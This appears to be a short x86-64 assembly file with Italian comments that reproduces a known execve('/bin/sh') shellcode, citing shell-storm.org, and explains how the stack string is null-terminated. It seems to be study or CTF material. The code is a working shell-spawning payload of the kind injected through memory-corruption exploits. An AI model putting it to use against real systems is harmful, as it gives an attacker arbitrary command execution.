#execve("//bin/sh",["//bin/sh"],NULL); --> syscall n°59
#https://shell-storm.org/shellcode/files/shellcode-603.html
.intel_syntax noprefix
.global	_start
.section	.text
_start:
	xor	rdx,rdx
	mov	rbx,0x68732f6e69622f2f #//bin/sh
	shr	rbx,0x8 #aggiunge lo 0 alla fine shiftando a dx //bin/sh --> /bin/sh0 (deve essere lunga x A PRESCINDERE --> se tolgo un carattere 
			#riempie il vuoto con uno 0)
	push	rbx
	mov	rdi,rsp
	push	rax
	push	rdi
	mov	rsi,rsp
	mov	al,0x3b #execv
	syscall
